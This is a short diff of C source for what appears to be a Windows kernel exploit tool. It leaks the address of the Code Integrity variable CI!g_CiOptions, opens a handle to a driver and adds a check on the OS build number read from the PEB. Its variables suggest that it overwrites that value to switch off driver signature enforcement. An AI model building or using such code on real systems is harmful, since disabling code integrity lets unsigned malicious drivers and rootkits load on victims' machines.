@@ -17,6 +17,7 @@ int main(int argc, char **argv)
   LPVOID CiImageBase   = 0;
   LPVOID CigOptsBase   = 0;
   LPVOID PhysAddr      = 0;
+  PPEB   PebPtr        = 0;
   DWORD  CiImageLen    = 0;
   ULONG  CurrentCiVal  = 0;
   ULONG  CurrentCiFix  = 1;
@@ -28,6 +29,14 @@ int main(int argc, char **argv)
     if ( (CigOptsBase = GetCiOptions1(CiImageBase)) != NULL )
     {
       printf("[+] Leaked CI!g_CiOptions @ %p\n", CigOptsBase);
+
+      PebPtr = NtCurrentTeb->ProcessEnvironmentBlock;
+
+      if ( PebPtr->OSBuildNumber < 16299 ) {
+	      printf("[ ] Currently does not support anything less than build 16299\n");
+	      return 0;
+      };
+
 
       if ( (hDriver = GetHandle()) != NULL ) 
       {
